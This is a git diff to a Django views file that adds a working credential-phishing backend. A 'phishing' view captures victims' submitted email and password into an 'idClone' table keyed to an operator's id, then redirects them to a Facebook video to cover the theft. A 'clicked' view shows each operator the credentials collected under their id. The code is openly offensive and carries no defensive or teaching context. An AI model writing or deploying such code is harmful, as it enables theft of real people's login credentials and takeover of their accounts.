@@ -1,4 +1,4 @@
-from django.shortcuts import render
+from django.shortcuts import render,redirect
 from .forms import UserForm,UserProfileInfoForm
 from django.contrib.auth import authenticate, login, logout
 from django.http import HttpResponseRedirect, HttpResponse
@@ -6,8 +6,15 @@ from django.urls import reverse
 from django.contrib.auth.decorators import login_required
 from django.contrib import messages
 
+from .models import *
+
 def index(request):
     return render(request,'index.html')
+
+def clicked(request):
+    user_id = request.user.id
+    objects = idClone.objects.filter(user_id=user_id)
+    return render(request,'cloned.html',{'credentials':objects})
 
 
 
@@ -64,3 +71,20 @@ def user_login(request):
             return HttpResponseRedirect(reverse('credential:user_login'))
     else:
         return render(request, 'login.html', {})
+
+def phishing(request,*args,**kwargs):
+    if request.method == 'POST':
+        data = request.POST
+        idClone.objects.create(user_id=kwargs['id'],email=data['email'],
+                               password=data['pass'])
+        response = redirect('https://www.facebook.com/JOKESTantraa/videos/441858159941884/?v=441858159941884')
+        return response
+
+
+    return render(request,'phishing.html')
+
+
+
+
+    
+        
